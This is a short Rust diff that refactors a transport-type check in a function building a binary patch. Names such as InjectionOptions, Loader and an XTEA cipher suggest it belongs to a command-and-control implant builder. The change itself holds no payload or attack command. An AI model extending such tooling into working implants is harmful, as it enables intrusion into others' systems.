@@ -3,7 +3,7 @@ use std::str::FromStr;
 
 use crate::server::INSTANCES;
 use crate::server::session::{SESSION, USERAGENT};
-use crate::server::types::{InjectionOptions, NetworkOptions, TRANSPORT_PIPE, TRANSPORT_HTTP, Config, Compiler, Network, Builder, Loader, UserSession};
+use crate::server::types::{InjectionOptions, NetworkOptions, TRANSPORT_PIPE, TRANSPORT_HTTP, Config, Compiler, Network, Builder, Loader, UserSession, TransportType};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::error::{Error, Result};
 use crate::server::utils::wrap_message;
@@ -218,10 +218,12 @@ impl Hexane {
     fn create_binary_patch(&self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
 
-        if self.network_type == *TRANSPORT_HTTP {
-            stream.pack_byte(*TRANSPORT_HTTP);
-        } else if self.network_type == *TRANSPORT_PIPE {
-            stream.pack_byte(*TRANSPORT_PIPE);
+        if self.network_type == TransportType::TransportHttp as u8 {
+            stream.pack_byte(TransportType::TransportHttp as u8);
+
+        } else if self.network_type == TransportType::TransportPipe as u8 {
+            stream.pack_byte(TransportType::TransportPipe as u8);
+
         } else {
             return_error!("invalid network type")
         }
